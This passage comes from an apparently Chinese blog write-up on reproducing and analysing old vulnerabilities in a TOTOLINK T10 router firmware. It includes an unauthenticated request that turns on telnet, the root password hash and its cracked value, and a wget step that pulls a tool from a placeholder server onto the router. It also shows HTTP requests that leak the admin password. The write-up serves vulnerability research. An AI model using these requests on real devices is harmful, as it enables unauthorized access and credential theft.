href=\"mailto:&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#54;&#46;&#x31;&#x35;\">&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#54;&#46;&#x31;&#x35;</a>:&#x2F;root&#x2F; # 拷贝路由器文件到虚拟机</p>\n<p>注意这里有个坑 </p>\n<p>就是上一个开启的qemu里面的squashfs-root不是要搭建的那个路由器的…很奇怪…不知道哪里来的…</p>\n<p>所以其实要先从物理机上考过去一份到qemu的debian系统里,然后再拷到路由系统里</p>\n<p>物理机&#x2F;云服务器执行: scp -r &#x2F;tmp&#x2F;squashfs-root 192.168.6.15:&#x2F;root&#x2F; 拷贝到qemu虚拟出的debian里面</p>\n<p>qemu里执行 scp -r squashfs-root&#x2F; <a href=\"mailto:&#114;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#54;&#x2e;&#x31;&#x35;\">&#114;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#54;&#x2e;&#x31;&#x35;</a>:&#x2F;root&#x2F;  拷贝到</p>\n<p>chroot .&#x2F;squashfs-root&#x2F; &#x2F;bin&#x2F;sh # 挂载路由器系统<br>.&#x2F;bin&#x2F;lighttpd -f .&#x2F;lighttp&#x2F;lighttpd.conf -m .&#x2F;lighttp&#x2F;lib # 启动路由器服务</p>\n<p>报错(server.c.624) opening pid-file failed: &#x2F;var&#x2F;run&#x2F;lighttpd.pid No such file or directory</p>\n<p>创建一下即可</p>\n<h2 id=\"1-2-流量转发\"><a href=\"#1-2-流量转发\" class=\"headerlink\" title=\"1.2 流量转发\"></a>1.2 流量转发</h2><p>怎么把流量转发出来呢?</p>\n<p>把qemu的流量转发到主机的端口</p>\n<p>ssh <a href=\"mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#54;&#46;&#x31;&#53;\">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#54;&#46;&#x31;&#53;</a> -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>把主机的流量转发到PC端口,就可以在自己电脑上访问了</p>\n<p>ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>或者安装一个图形化界面(用服务器搭建的)</p>\n<p>ssh <a href=\"mailto:&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#54;&#x2e;&#x31;&#x35;\">&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#54;&#x2e;&#x31;&#x35;</a> -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>或者直接一个转发就行了吧?(vps关了,还没尝试)</p>\n<p>ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:192.168.6.15:80</p>\n<h2 id=\"1-3-虚拟环境的各种问题\"><a href=\"#1-3-虚拟环境的各种问题\" class=\"headerlink\" title=\"1.3 虚拟环境的各种问题\"></a>1.3 虚拟环境的各种问题</h2><p>登陆报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">46</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Date: Sun, <span class=\"number\">07</span> May <span class=\"number\">2023</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">58</span> GMT</span><br><span class=\"line\">Server: lighttpd/<span class=\"number\">1.4</span><span class=\"number\">.20</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">58</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">03</span>: (mod_cgi.c<span class=\"number\">.588</span>) cgi died, pid: <span class=\"number\">2588</span> </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">06</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">09</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Date: Sun, <span class=\"number\">07</span> May <span class=\"number\">2023</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">19</span> GMT</span><br><span class=\"line\">Server: lighttpd/<span class=\"number\">1.4</span><span class=\"number\">.20</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">19</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br></pre></td></tr></table></figure>\n\n<p>访问home.asp直接下载文件了….</p>\n<p>换个版本?</p>\n<p><a href=\"https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518\">https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518</a></p>\n<p>TOTOLINK NR1800X</p>\n<p><a href=\"http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=70&amp;ids=36\">http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=70&amp;ids=36</a></p>\n<p>好奇怪..用user模式是这个,system模式就不是了…</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508070257022.png\" alt=\"image-20230508070257022\"></p>\n<p>把东西拷其进去后 404了 </p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508072223637.png\" alt=\"image-20230508072223637\"></p>\n<p>但是在服务器里面测试是好的</p>\n<p>搭建图形化界面<a href=\"https://zhuanlan.zhihu.com/p/436458664\">https://zhuanlan.zhihu.com/p/436458664</a></p>\n<p>vnc一开始连不上是防火墙的事,把防火墙关了,可以在图形化界面里直接访问</p>\n<h2 id=\"1-4-真机\"><a href=\"#1-4-真机\" class=\"headerlink\" title=\"1.4 真机\"></a>1.4 真机</h2><p>​\t\t因为自己的机器是mac,m1架构,搭建不了x86的虚拟机,就用的云服务器,比较麻烦,然后环境也有问题,于是买了一个真机,但是真机也有问题,导致自己很崩溃,通宵了一晚上去调试环境,但不论怎么搭建虚拟环境或者用真机,在登录页面点击登陆后,都登陆不进去</p>\n<p>​\t\t后来无意中在百度贴吧搜索发现有人和我一样的问题……………居然是要用远古的ie或者360浏览器的兼容模式才能打开…</p>\n<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154418746.png\" alt=\"image-20230509154418746\" style=\"zoom:33%;\">\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/4022899e2b386926fcc791a13bcb575b.png\" alt=\"4022899e2b386926fcc791a13bcb575b\"></p>\n<h1 id=\"二、-获取初始shell\"><a href=\"#二、-获取初始shell\" class=\"headerlink\" title=\"二、 获取初始shell\"></a>二、 获取初始shell</h1><h2 id=\"2-1-telnet\"><a href=\"#2-1-telnet\" class=\"headerlink\" title=\"2.1 telnet\"></a>2.1 telnet</h2><p>​\t\t在路由器管理后台开启telnet功能,或者直接python发包获取(未授权)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-password获取\"><a href=\"#2-2-password获取\" class=\"headerlink\" title=\"2.2 password获取\"></a>2.2 password获取</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root cat etc/shadow.sample</span><br><span class=\"line\">root:$<span class=\"number\">1</span>$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:<span class=\"number\">16090</span>:<span class=\"number\">0</span>:<span class=\"number\">99999</span>:<span class=\"number\">7</span>:::</span><br><span class=\"line\">nobody:*:<span class=\"number\">14495</span>:<span class=\"number\">0</span>:<span class=\"number\">99999</span>:<span class=\"number\">7</span>:::</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t解密结果是cs2012</p>\n<h1 id=\"三、框架分析\"><a href=\"#三、框架分析\" class=\"headerlink\" title=\"三、框架分析\"></a>三、框架分析</h1><h2 id=\"3-1-目录梳理\"><a href=\"#3-1-目录梳理\" class=\"headerlink\" title=\"3.1 目录梳理\"></a>3.1 目录梳理</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--bin\t\t\t\t\t二进制文件</span><br><span class=\"line\">--lib</span><br><span class=\"line\">    --cste_modules  \t.so库文件</span><br><span class=\"line\">--web_cste    \t\t\t浏览器web后台主目录</span><br><span class=\"line\">\t--adm\t\t\t\t管理员后台</span><br><span class=\"line\">    --cgi-bin\t\t\t功能处理</span><br><span class=\"line\">    --firewall    \t\t防火墙功能</span><br><span class=\"line\">\tlogin.asp\t\t\t登陆页面</span><br><span class=\"line\">    telnet.asp\t\t\ttelnet控制页面</span><br></pre></td></tr></table></figure>\n\n\n\n<p>进去之后\t 进行信息收集, 先传一个busybox-mipsel</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server <span class=\"number\">80</span> 起一个服务,传一下</span><br><span class=\"line\">wget http:<span class=\"comment\">//xxxxxxxx/busybox-mipsel</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t收集进程信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1028</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> udhcpd /var/udhcpd.conf</span><br><span class=\"line\"><span class=\"number\">1269</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> ppp_inet -t <span class=\"number\">3</span> -c <span class=\"number\">0</span> -x</span><br><span class=\"line\"><span class=\"number\">1279</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> dnsmasq</span><br><span class=\"line\"><span class=\"number\">1285</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> lld2d br0</span><br><span class=\"line\"><span class=\"number\">1301</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> fwd</span><br><span class=\"line\"><span class=\"number\">1329</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> cs_broker -c /etc/mosquitto.conf</span><br><span class=\"line\"><span class=\"number\">1335</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> cste_sub -h <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> -t totolink/router/#</span><br><span class=\"line\"><span class=\"number\">1352</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> telnetd</span><br><span class=\"line\"><span class=\"number\">1360</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> csteDriverConnMachine</span><br><span class=\"line\"><span class=\"number\">1365</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> crond</span><br><span class=\"line\"><span class=\"number\">1366</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> [kworker/<span class=\"number\">0</span>:<span class=\"number\">1</span>H]</span><br><span class=\"line\"><span class=\"number\">1376</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib/</span><br><span class=\"line\"><span class=\"number\">1398</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> /bin/getty -L ttyS0 <span class=\"number\">38400</span> vt100</span><br><span class=\"line\"><span class=\"number\">1400</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> watchdog -c /var/cs_watchdog.conf</span><br><span class=\"line\"><span class=\"number\">1924</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> -sh</span><br><span class=\"line\"><span class=\"number\">2178</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> ./busybox-mipsel ps auxf</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t网络信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./busybox-mipsel netstat -alp</span><br><span class=\"line\">Active Internet <span class=\"title function_\">connections</span> <span class=\"params\">(servers and established)</span></span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class=\"line\">tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      1376/lighttpd</span><br><span class=\"line\">tcp        0      0 0.0.0.0:domain          0.0.0.0:*               LISTEN      1279/dnsmasq</span><br><span class=\"line\">tcp        0      0 0.0.0.0:telnet          0.0.0.0:*               LISTEN      1352/telnetd</span><br><span class=\"line\">tcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      1329/cs_broker</span><br><span class=\"line\">tcp        0      0 127.0.0.1:1883          127.0.0.1:56383         ESTABLISHED 1329/cs_broker</span><br><span class=\"line\">tcp        0      0 127.0.0.1:56383         127.0.0.1:1883          ESTABLISHED 1335/cste_sub</span><br><span class=\"line\">tcp        0    157 router.totolink.com:telnet 192.168.55.3:62063      ESTABLISHED 1352/telnetd</span><br><span class=\"line\">netstat: /proc/net/tcp6: No such file or directory</span><br><span class=\"line\">udp        0      0 0.0.0.0:domain          0.0.0.0:*                           1279/dnsmasq</span><br><span class=\"line\">udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           1028/udhcpd</span><br><span class=\"line\">netstat: /proc/net/udp6: No such file or directory</span><br><span class=\"line\">netstat: /proc/net/raw6: No such file or directory</span><br><span class=\"line\">Active UNIX domain <span class=\"title function_\">sockets</span> <span class=\"params\">(servers and established)</span></span><br><span class=\"line\">Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1590 1335/cste_sub</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1282 1028/udhcpd</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1591 1335/cste_sub</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1283 1028/udhcpd</span><br><span class=\"line\">unix  2      [ ]         DGRAM                      1488 1279/dnsmasq</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"四、逻辑功能、业务流程梳理\"><a href=\"#四、逻辑功能、业务流程梳理\" class=\"headerlink\" title=\"四、逻辑功能、业务流程梳理\"></a>四、逻辑功能、业务流程梳理</h1><h2 id=\"4-1-登陆\"><a href=\"#4-1-登陆\" class=\"headerlink\" title=\"4.1 登陆\"></a>4.1 登陆</h2><p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513200756944.png\" alt=\"image-20230513200756944\"></p>\n<p>​\t\tformLoginAuth.htm 这个东西其实在lighttpd里面, 它只是一个变量名,不代表文件,判断这个文件名,会调用Form_Login函数</p>\n<h3 id=\"4-1-1-密码泄露\"><a href=\"#4-1-1-密码泄露\" class=\"headerlink\" title=\"4.1.1 密码泄露\"></a>4.1.1 密码泄露</h3><p>这个请求包存在一个问题,即不论用户名密码是否正确,都调用它,然后返回前端,于是就有了一个用户名密码泄露漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /cgi-bin/cstecgi.cgi HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded; charset=UTF<span class=\"number\">-8</span></span><br><span class=\"line\">Accept: *<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">X-Requested-With: XMLHttpRequest</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://192.168.0.1/title.asp</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-Hans-CN,zh-Hans;q=0.5</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 37</span></span><br><span class=\"line\"><span class=\"comment\">Host: 192.168.0.1</span></span><br><span class=\"line\"><span class=\"comment\">Pragma: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: SESSION_ID=2:1516657290:2</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#123;&quot;topicurl&quot;:&quot;setting/getLanguageCfg&quot;&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">HTTP/1.1 200 OK</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: text/plain</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 340</span></span><br><span class=\"line\"><span class=\"comment\">Pragma: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Cache-Control: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Date: Mon, 22 Jan 2018 21:36:50 GMT</span></span><br><span class=\"line\"><span class=\"comment\">Server: lighttpd/1.4.20</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;operationMode&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginFlag&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;multiLangBt&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;helpBt&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;fmVersion&quot;:\t&quot;V5.9c.1485&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;title&quot;:\t&quot;TOTOLINK&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;langFlag&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;languageType&quot;:\t&quot;cn&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;helpUrl&quot;:\t&quot;www.totolink.cn&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;usbFlag&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;productName&quot;:\t&quot;T10&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;lanIp&quot;:\t&quot;192.168.0.1&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;wanConnStatus&quot;:\t&quot;disconnected&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginUser&quot;:\t&quot;admin&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginPass&quot;:\t&quot;123456888&quot;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514173245584.png\" alt=\"image-20230514173245584\"></p>\n<h2 id=\"4-2-admin后台\"><a href=\"#4-2-admin后台\" class=\"headerlink\" title=\"4.2 admin后台\"></a>4.2 admin后台</h2><h3 id=\"4-2-1-password-asp\"><a href=\"#4-2-1-password-asp\" class=\"headerlink\" title=\"4.2.1 password.asp\"></a>4.2.1 password.asp</h3><p>​\t\t通过setting&#x2F;getPasswordCfg接口可以直接获取密码,而且未做鉴权</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var rJson;</span><br><span class=\"line\">$(function()&#123;</span><br><span class=\"line\">\tvar postVar=&#123;topicurl:<span class=\"string\">&quot;setting/getPasswordCfg&quot;</span>&#125;;</span><br><span class=\"line\">\tpostVar=JSON.stringify(postVar);</span><br><span class=\"line\">\t$.ajax(&#123;  </span><br><span class=\"line\">       \ttype : <span class=\"string\">&quot;post&quot;</span>, url : <span class=\"string\">&quot; /cgi-bin/cstecgi.cgi&quot;</span>, data : postVar, async : <span class=\"literal\">false</span>, success : function(Data)&#123;</span><br><span class=\"line\">\t\t\trJson=JSON.parse(Data);</span><br><span class=\"line\">\t\t\tsupplyValue(<span class=\"string\">&quot;admuser&quot;</span>,rJson[<span class=\"string\">&#x27;admuser&#x27;</span>]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    &#125;);\t\t</span><br><span class=\"line\">\t$(<span class=\"string\">&quot;#div_admpass11,#div_admpass21&quot;</span>).show();<span class=\"comment\">//p</span></span><br><span class=\"line\">\t$(<span class=\"string\">&quot;#div_admpass12,#div_admpass22&quot;</span>).hide();<span class=\"comment\">//t</span></span><br><span class=\"line\">\ttry&#123; </span><br><span class=\"line\">\t\tparent.frames[<span class=\"string\">&quot;title&quot;</span>].initValue();</span><br><span class=\"line\">\t&#125;catch(e)&#123;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<h3 id=\"4-2-2-所以asp里的功能-是怎么对应到后面的\"><a href=\"#4-2-2-所以asp里的功能-是怎么对应到后面的\" class=\"headerlink\" title=\"4.2.2 所以asp里的功能 是怎么对应到后面的?\"></a>4.2.2 所以asp里的功能 是怎么对应到后面的?</h3><p>​\t\t答: 通过mqtt协议转发,前端的功能,通过类似于setting&#x2F;getPasswordCfg的消息,发送给代理程序,然后代理程序交给后端服务处理程序来处理,然后再相反路径返回结果</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513201442154.png\" alt=\"image-20230513201442154\"></p>\n<h3 id=\"4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢\"><a href=\"#4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢\" class=\"headerlink\" title=\"4.2.3 客户端如何转发的请求?为什么&#x2F;cgi-bin&#x2F;cstecgi.cgi里面对应的功能不全呢?\"></a>4.2.3 客户端如何转发的请求?为什么&#x2F;cgi-bin&#x2F;cstecgi.cgi里面对应的功能不全呢?</h3><p>​\t\t比如setting&#x2F;getPasswordCfg  它其实是在 system.so里\t</p>\n<p>​\t\t答:cstecgi.cgi里并没有包含所有功能,它主要是包含了请求重定向,登陆等功能,其余的功能,会通过转发请求和加载库的机制实现</p>\n<p>在这里匹配不到的最后都会通过else里的这两个函数进行转发请求,给后面的处理程序进行处理. 可以看到,这里转发给了mqtt的代理程序,因为连接到了1883端口.</p>\n<p><img 